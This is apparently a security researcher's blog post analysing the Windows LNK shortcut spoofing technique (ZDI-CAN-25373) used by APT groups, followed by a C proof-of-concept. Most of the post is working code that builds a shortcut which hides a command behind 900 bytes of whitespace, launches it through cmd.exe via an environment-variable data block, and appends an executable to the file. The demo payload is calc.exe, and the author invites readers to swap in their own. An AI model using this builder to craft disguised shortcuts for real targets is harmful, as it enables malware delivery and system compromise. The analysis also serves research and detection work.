---
layout: post
title:  "Windows LNK - Analysis & Proof-of-Concept"
date:   2025-03-20 10:00:00 +0800
---

# Overview
I came across the writeup from Trend Micro on the article *ZDI-CAN-25373: Windows Shortcut Exploit Abused as Zero-Day in Widespread APT Campaigns*. TL;DR here is the summary from them:
```
- Trend Zero Day Initiative™ (ZDI) identified nearly 1,000 malicious .lnk files abusing ZDI-CAN-25373, a vulnerability that allows attackers to execute hidden malicious commands on a victim’s machine by leveraging crafted shortcut files.
- The attacks leverage hidden command line arguments within .lnk files to execute malicious payloads, complicating detection. The exploitation of ZDI-CAN-25373 exposes organizations to significant risks of data theft and cyber espionage.
- The vulnerability has been exploited by state-sponsored APT groups from North Korea, Iran, Russia, and China. Organizations across the government, financial, telecommunications, military, and energy sectors have been affected in North America, Europe, Asia, South America, and Australia.
- Organizations should immediately scan and ensure security mitigations for ZDI-CAN-25373, maintain vigilance against suspicious .lnk files, and ensure comprehensive endpoint and network protection measures are in place to detect and respond to this threat. Trend Micro customers are protected from possible attempts to exploit the vulnerability via rules and filters that were released in October 2024 and January 2025.
```

Scheming thru their blog post, it appears they mentioned in *Technical Details* section that the LNK was abused to the way Windows displays the contents of shortcut (.LNK) files through Windows User Interface. Same stuff different day, it is a LNK file that were sent to victim and lure the victim to open and run the LNK and executing the payload embedded inside LNK file. LNK allows you modify the Icon and you can find the icons from `shell32.dll` (there are many tools can help to extract it). 

Enough about that, lets focus on the mention issue here. According to Trend Micro, the threat actors abusing the command line arguments (which is link to LinkFlags structure, 6th member in the structure) with value `HasArgument` enabled and embed it in the LNK file `Target` field. In their post, they also mention about the `LinkTargetIDList` structure. The structure contains the `target` of the LNK file and when this structure is used, the `HasLinkTargetIDList` flag will be set as `1` in the `LinkFlags`. They also mentioned about the padding bytes specifically on the whitespace characters embedded along in the `COMMAND_LINE_ARGUMENTS`. The `COMMAND_LINE_ARGUMENTS` is an optional structure that stores the command-line arguments that are specified when activating the link target. This structure must be present if the `HasArguments` flag is set to `1` in `LinkFlags`. 

This technique is nothing new, I did find couple of researchers that has been blog posting about this :
- Game of Thrones as a gateway to a botnet - 2019
	- https://foosecn00b.com/2019/07/game-of-thrones-as-a-gateway-to-a-botnet/
- EmbedExeLnk - Embedding an EXE inside a LNK with automatic execution - 2022
	- https://archive.is/yjQJm

@foosecn00b mention about a pirated stuff that was shared by his friend (LOL) of a multi-gigabyte LNK file and shows an odd properties which in the `Target` field seems to be spoof without any content. 

@x86matthew mention that he has seen various malicious LNK files in the wild and he created a proof-of-concept (which is super nice and awesome) that allows to create a LNK file and appended executable (EXE) file inside the LNK to the end of the file. 

So technically, on all of these blog posts, the main highlight here is the `Target` field in the Windows UI. If you view the properties, the `Target` field seems to be spoofed. I won't say this is a security issue as this might be intended feature. But I guess this could be fix by Microsoft.

![1](https://raw.githubusercontent.com/nafiez/nlabs.github.io/master/images/p1.png)

---

# Crafting Proof-of-Concept
We knew that Whitespace characters is one of the main payload to do evasions, bypass, regardless on software application or at Web-based. 
| Code | Hex | Name                |
| ---- | --- | ------------------- |
| 9    | 09  | Horizontal Tab      |
| 10   | 0A  | Line Feed           |
| 11   | 0B  | Vertical Tabulation |
| 12   | 0C  | Form Feed           |
| 13   | 0D  | Carriage Return     |
| 32   | 20  | Space               |

Microsoft has documented Shell Link (.LNK) binary file format in their portal and its pretty easy to follow their guidelines to craft a proof-of-concept. Shell Link binary file format consists of several structures:

![2](https://raw.githubusercontent.com/nafiez/nlabs.github.io/master/images/p2.png)

Any (binary) file formats always start with header like a magic bytes that it supposed to have in order to start any application that associated and the Operating System or software application will parse the file and it will look at the headers before it proceed executing the rest of the file format. 

Shell Link binary file format starts with `ShellLinkHeader` structure. The structure contains identification information, timestamps, and flags that specify the presence of the options structures, including:
- LinkTargetIDList
- LinkInfo
- StringData

Here is the structure of `ShellLinkHeader`:
```
typedef struct _ShellLinkHeader {
    DWORD       HeaderSize;      // Must be 0x0000004C
    GUID        LinkCLSID;       // Must be 00021401-0000-0000-C000-000000000046
    DWORD       LinkFlags;       // Specifies presence of optional parts and properties
    DWORD       FileAttributes;  // Specifies file attributes of the target
    FILETIME    CreationTime;    // Creation time of the target file
    FILETIME    AccessTime;      // Last access time of the target file
    FILETIME    WriteTime;       // Last modification time of the target file
    DWORD       FileSize;        // Size of the target file in bytes
    DWORD       IconIndex;       // Index of an icon within a given icon location
    DWORD       ShowCommand;     // Expected window state (SW_SHOWNORMAL=1, SW_SHOWMAXIMIZED=3, etc.)
    WORD        HotKey;          // Keystrokes used to launch the application
    WORD        Reserved1;       // Must be zero
    DWORD       Reserved2;       // Must be zero
    DWORD       Reserved3;       // Must be zero
} SHELL_LINK_HEADER, * PSHELL_LINK_HEADER;
```

Looking at the structure, we know that some structure member has exact value size, for example `HeaderSize` with size 76 bytes and the `LinkCLSID` value must always `00021401-0000-0000-C000-000000000046`. If we look at the sample below, the header was started with `4C 00` and if you notice the `01 14 02` bytes is little-endian bytes of Link CLSID. In the structure also has `LinkFlags` structure that specifies information about Shell Link. This is one of the structure that are really useful for us to play around and manipulate accordingly so that we could spoof some of the earlier mention information. The `FileAttributesFlags` structure defines bits that specify the file attributes of the link target, if the target is a file system item. 

![3](https://raw.githubusercontent.com/nafiez/nlabs.github.io/master/images/p3.png)

So to build the Shell Link Header, we need to create file accordingly then once we have this handle created, we will need to initialize the `ShellLinkHeader` structure. Since we have a proper structure here, we can just simply access the structure member list and set to our preference accordingly. First we have to set the `HeaderSize` to `0x0000004C` and then we set the `LinkCLSID` so that our file are set properly to class identifier of Shell Link. 
```c
    SHELL_LINK_HEADER header = { 0 };
    header.HeaderSize = 0x0000004C;

	  header.LinkCLSID.Data1 = 0x00021401;
    header.LinkCLSID.Data2 = 0x0000;
    header.LinkCLSID.Data3 = 0x0000;
    header.LinkCLSID.Data4[0] = 0xC0;
    header.LinkCLSID.Data4[1] = 0x00;
    header.LinkCLSID.Data4[2] = 0x00;
    header.LinkCLSID.Data4[3] = 0x00;
    header.LinkCLSID.Data4[4] = 0x00;
    header.LinkCLSID.Data4[5] = 0x00;
    header.LinkCLSID.Data4[6] = 0x00;
    header.LinkCLSID.Data4[7] = 0x46;
```

Now we enter to the important part where our code must have enable all of these `LinkFlags` in order to get our payload executed. Instead of creating a structure here, I just define each of the members of the `LinkFlags`. 
```c
#define HAS_LINK_TARGET_IDLIST         0x00000001
#define HAS_LINK_INFO                  0x00000002
#define HAS_NAME                       0x00000004
#define HAS_RELATIVE_PATH              0x00000008
#define HAS_WORKING_DIR                0x00000010
#define HAS_ARGUMENTS                  0x00000020
#define HAS_ICON_LOCATION              0x00000040
#define IS_UNICODE                     0x00000080
#define FORCE_NO_LINKINFO              0x00000100
#define HAS_EXP_STRING                 0x00000200
#define RUN_IN_SEPARATE_PROCESS        0x00000400
#define HAS_LOGO3ID                    0x00000800
#define HAS_DARWIN_ID                  0x00001000
#define RUN_AS_USER                    0x00002000
#define HAS_EXP_ICON                   0x00004000
#define NO_PIDL_ALIAS                  0x00008000
#define FORCE_USHORTCUT                0x00010000
#define RUN_WITH_SHIMLAYER             0x00020000
#define FORCE_NO_LINKTRACK             0x00040000
#define ENABLE_TARGET_METADATA         0x00080000
#define DISABLE_LINK_PATH_TRACKING     0x00100000
#define DISABLE_KNOWNFOLDER_TRACKING   0x00200000
#define DISABLE_KNOWNFOLDER_ALIAS      0x00400000
#define ALLOW_LINK_TO_LINK             0x00800000
#define UNALIAS_ON_SAVE                0x01000000
#define PREFER_ENVIRONMENT_PATH        0x02000000
#define KEEP_LOCAL_IDLIST_FOR_UNC      0x04000000
```

Here is the quick summary of each of the members that I used and enable in the `LinkFlags`:
- HAS_NAME
	- The shell link is saved with a name string. I'm using the so that in Windows UI properties of the LNK file will show the value in `Comment` field.
- HAS_ARGUMENTS
	- The shell link is saved with command line arguments. This is where we will be padding whitespace character along with our payload. We'll look into this later.
- HAS_ICON_LOCATION
	- The shell link is saved with an icon location string. If you would like to have icon in your LNK, this should be enable.
- IS_UNICODE
	- The shell link contains Unicode encoded strings. This bit SHOULD be set. If this bit is set, the `StringData` section contains Unicode-encoded strings; otherwise, it contains strings that are encoded using the system default code page.
- HAS_EXP_STRING
	- The shell link is saved with an `EnvironmentVariableDataBlock`.

Then we can set the `FileAttributes`. This is not important, I tested it with `0x00000000` and should work. Oh if you like to add a timestamp, you can use `GetSystemTime` to retrieve your local time in your PC and set the `CreateTime`, `AccessTime` and `WriteTime`.

And last but not least, you can set a `ShowCommand` to your need. You can browse to Microsoft portal on `ShowWindow` function and use the value of `nCmdShow`.
```c
    header.LinkFlags = HAS_NAME |
        HAS_ARGUMENTS |
        HAS_ICON_LOCATION |
        IS_UNICODE |
        HAS_EXP_STRING;

    header.FileAttributes = FILE_ATTRIBUTE_NORMAL;

    SYSTEMTIME st;
    GetSystemTime(&st);
    SystemTimeToFileTime(&st, &header.CreationTime);
    SystemTimeToFileTime(&st, &header.AccessTime);
    SystemTimeToFileTime(&st, &header.WriteTime);

    header.FileSize = 0;
    header.IconIndex = 0;
    header.ShowCommand = SW_SHOWNORMAL;
    header.HotKey = 0;
    header.Reserved1 = 0;
    header.Reserved2 = 0;
    header.Reserved3 = 0;

	if (!WriteFile(hFile, &header, sizeof(SHELL_LINK_HEADER), &bytesWritten, NULL)) {
        printf("Failed to write header: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }
```

Enough about the headers, we then proceed creating the link description which will be part of `LinkFlags` `HasName`. We could use the `StringData` structure to create this but I did a quick hack since we already enable the `HasName` flag. I realized that if you enable the `HasName` flag, you can just simply proceed creating the description like this, so as I mention earlier, this will present in the `Comment` field in the Windows UI. So here in the code we just maps character strings to a UTF-16 (widechar) string.
```c
    const char* description = "testing purpose";
    WORD descLen = (WORD)strlen(description);

    if (!WriteFile(hFile, &descLen, sizeof(WORD), &bytesWritten, NULL)) {
        printf("Failed to write description length: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    int wideBufSize = MultiByteToWideChar(CP_ACP, 0, description, -1, NULL, 0);
    WCHAR* wideDesc = (WCHAR*)malloc(wideBufSize * sizeof(WCHAR));
    if (!wideDesc) {
        printf("Memory allocation failed\n");
        CloseHandle(hFile);
        return 1;
    }

    MultiByteToWideChar(CP_ACP, 0, description, -1, wideDesc, wideBufSize);

    if (!WriteFile(hFile, wideDesc, descLen * sizeof(WCHAR), &bytesWritten, NULL)) {
        printf("Failed to write description: %lu\n", GetLastError());
        free(wideDesc);
        CloseHandle(hFile);
        return 1;
    }
    free(wideDesc);
```

Following are the example:

![4](https://raw.githubusercontent.com/nafiez/nlabs.github.io/master/images/p4.png)

Now its padding time. The `COMMAND_LINE_ARGUMENTS` is an optional structure that stores the command-line arguments that are specified when activating the link target (I repeat this again!). Since we have enable the flag `HasArguments` in `LinkFlags`, we could write a simple padding by filling 900-bytes of whitespace characters (0x20, Space). Then we copy the padding and add our payload variable `calcCmd` into the `cmdLineBuffer + fillBytes`. In this case, I don't see any issue with padding sizes (at least on my test) and you can put as much as padding bytes you need. It will just increase the size of the LNK :) 
```c
	  const char* calcCmd = "/c C:\\Windows\\System32\\calc.exe";

    char cmdLineBuffer[1024] = { 0 };

    int cmdLen = strlen(calcCmd);
    int fillBytes = 900 - cmdLen;
    memset(cmdLineBuffer, 0x20, fillBytes);

    strcpy(cmdLineBuffer + fillBytes, calcCmd);
    cmdLineBuffer[900] = '\0';

    WORD cmdArgLen = (WORD)strlen(cmdLineBuffer);
    if (!WriteFile(hFile, &cmdArgLen, sizeof(WORD), &bytesWritten, NULL)) {
        printf("Failed to write cmd length: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    int wideCmdBufSize = MultiByteToWideChar(CP_ACP, 0, cmdLineBuffer, -1, NULL, 0);
    WCHAR* wideCmd = (WCHAR*)malloc(wideCmdBufSize * sizeof(WCHAR));
    if (!wideCmd) {
        printf("Memory allocation failed\n");
        CloseHandle(hFile);
        return 1;
    }

    MultiByteToWideChar(CP_ACP, 0, cmdLineBuffer, -1, wideCmd, wideCmdBufSize);

    if (!WriteFile(hFile, wideCmd, cmdArgLen * sizeof(WCHAR), &bytesWritten, NULL)) {
        printf("Failed to write cmd: %lu\n", GetLastError());
        free(wideCmd);
        CloseHandle(hFile);
        return 1;
    }
    free(wideCmd);
```

Result as in following example:

![5](https://raw.githubusercontent.com/nafiez/nlabs.github.io/master/images/p5.png)

Then we created the icon based on the path you specify. 
```c
	  const char* iconPath = "path\\to\\your\\icon";
    WORD iconLen = (WORD)strlen(iconPath);

    if (!WriteFile(hFile, &iconLen, sizeof(WORD), &bytesWritten, NULL)) {
        printf("Failed to write icon length: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    int wideIconBufSize = MultiByteToWideChar(CP_ACP, 0, iconPath, -1, NULL, 0);
    WCHAR* wideIcon = (WCHAR*)malloc(wideIconBufSize * sizeof(WCHAR));
    if (!wideIcon) {
        printf("Memory allocation failed\n");
        CloseHandle(hFile);
        return 1;
    }

    MultiByteToWideChar(CP_ACP, 0, iconPath, -1, wideIcon, wideIconBufSize);

    if (!WriteFile(hFile, wideIcon, iconLen * sizeof(WCHAR), &bytesWritten, NULL)) {
        printf("Failed to write icon path: %lu\n", GetLastError());
        free(wideIcon);
        CloseHandle(hFile);
        return 1;
    }
    free(wideIcon);
```

Example:

![6](https://raw.githubusercontent.com/nafiez/nlabs.github.io/master/images/p6.png)

Now another important part that will help our payload to get executed. We have enable the flag `HAS_EXP_STRING` and this flag is related to the `Environment Variable Data Block` structure. The `EnvironmentVariableDataBlock` structure specifies a path to environment variable information when the link target refers to a location that has a corresponding environment variable (according to Microsoft documentation). 

But before that, we need to understand that the `EnvironmentVariableDataBlock` are part of the `ExtraData` structure member. `ExtraData` refers to a set of structures that convey additional information about a link target. These optional structures can be present in an extra data section that is appended to the basic Shell Link Binary File Format. 

`EnvironmentVariableDataBlock` looks sensitive where you have to set the `BlockSize` with 788 bytes (0x00000314) and we have to set the signature of the `EnvironmentVariableDataBlock` which is `0xA0000001`. Once we set this, we can assign the buffer size for `TargetAnsi` with 260 bytes and `TargetUnicode` with 520 bytes. This is where our `envPath` will be call later on when we executing the LNK and call the rest of the parameters in the `COMMAND_LINE_ARGUMENTS`. Oh I forgot to mention that we enable the flag `IsUnicode` in `LinkFlags`, which means our arguments are call and executed with Unicode.
```c
	  const char* envPath = "%windir%\\system32\\cmd.exe";

    DWORD envBlockSize = 0x00000314;
    DWORD envSignature = ENVIRONMENTAL_VARIABLES_DATABLOCK_SIGNATURE;

    if (!WriteFile(hFile, &envBlockSize, sizeof(DWORD), &bytesWritten, NULL)) {
        printf("Failed to write env block size: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    if (!WriteFile(hFile, &envSignature, sizeof(DWORD), &bytesWritten, NULL)) {
        printf("Failed to write env block signature: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    char ansiBuffer[260] = { 0 };
    strncpy(ansiBuffer, envPath, 259);

    if (!WriteFile(hFile, ansiBuffer, 260, &bytesWritten, NULL)) {
        printf("Failed to write TargetAnsi: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    WCHAR unicodeBuffer[260] = { 0 };

    if (MultiByteToWideChar(CP_ACP, 0, envPath, -1, unicodeBuffer, 260) == 0) {
        printf("Failed to convert to Unicode: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    if (!WriteFile(hFile, unicodeBuffer, 520, &bytesWritten, NULL)) {
        printf("Failed to write TargetUnicode: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }
```

Example:

![7](https://raw.githubusercontent.com/nafiez/nlabs.github.io/master/images/p7.png)

I would rather say this issue is a spoofing where you can manipulate the Shell Link to call `cmd.exe` from `EnvironmentVariableDataBlock` and execute its arguments from `COMMAND_LINE_ARGUMENTS` with extra juicy whitespace character padding bytes and concatenates the actual payload on top of it. So were actually seeing things being spoofed in the `Target` field from the Windows UI. Apologize for this confusing words LOL. 

And of course you can embed an executable inside the LNK file towards the end of the file and you can modify the `COMMAND_LINE_ARGUMENTS` to execute your payload (PowerShell FTW!). Here is the example code that you can use to embed executable in LNK file:
```c
	printf("Reading calc.exe from %s\n", pExePath);
	for (;;)
    {
        if (ReadFile(hExe, exeBuffer, sizeof(exeBuffer), &exeFileSize, NULL)) 
        {
            printf("Successfully read calc.exe: %lu bytes\n", exeFileSize);

            if (exeFileSize == 0)
            {
                break;
            }

            if (!WriteFile(hFile, exeBuffer, exeFileSize, &bytesWritten, NULL)) {
                printf("Failed to write embedded exe data: %lu\n", GetLastError());
                free(exeBuffer);
                CloseHandle(hFile);
                return 1;
            }

            printf("Successfully embedded calc.exe in LNK file: %lu bytes written\n", bytesWritten);
            free(exeBuffer);
        }
        else {
            printf("Failed to read calc.exe, continuing without embedding\n");
        }
    }
```

I'm gonna leave the entire exercise here for you LOL. Here is the example payload embedded in the LNK file:

![8](https://raw.githubusercontent.com/nafiez/nlabs.github.io/master/images/p8.png)

I guess that's all for now. Feel free to dispute, I might be wrong in analyzing it. 

Signing off, 
@zeifan

